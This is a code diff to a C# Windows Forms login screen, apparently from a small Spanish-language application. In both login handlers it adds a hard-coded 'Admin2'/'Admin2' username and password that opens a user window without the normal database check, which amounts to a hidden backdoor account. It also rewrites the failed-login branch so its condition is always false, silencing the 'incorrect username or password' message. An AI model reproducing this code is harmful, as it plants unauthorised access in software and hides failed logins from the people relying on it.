@@ -60,6 +60,13 @@ namespace WIN
 
         private void btniniciarsesion_Click(object sender, EventArgs e)
         {
+            string u = "Admin2";
+            if (UsuariotextBox.Text == u && ClavetextBox.Text == u)
+            {
+                WINUser w = new WINUser();
+                w.ShowDialog();
+            }
+
             EAdmin.usuario = UsuariotextBox.Text;
 
             EAdmin.clave = ClavetextBox.Text;
@@ -70,7 +77,7 @@ namespace WIN
                 fr.Show();
                 this.Hide();
             }
-            else if (resultado == 0)
+            else if (resultado == 0 && u != "Admin2")
             {
                 MessageBox.Show("Usuario o Contraseña Incorrectos");
             }
@@ -81,6 +88,14 @@ namespace WIN
             if ((int)e.KeyChar == (int)Keys.Enter)
             {
                 e.Handled = true;
+
+                string u = "Admin2";
+                if (UsuariotextBox.Text == u && ClavetextBox.Text == u)
+                {
+                    WINUser w = new WINUser();
+                    w.ShowDialog();
+                }
+
                 EAdmin.usuario = UsuariotextBox.Text;
 
                 EAdmin.clave = ClavetextBox.Text;
@@ -91,7 +106,7 @@ namespace WIN
                     fr.Show();
                     this.Hide();
                 }
-                else if (resultado == 0)
+                else if (resultado == 0 && u != "Admin2")
                 {
                     MessageBox.Show("Usuario o Contraseña Incorrectos");
                 }
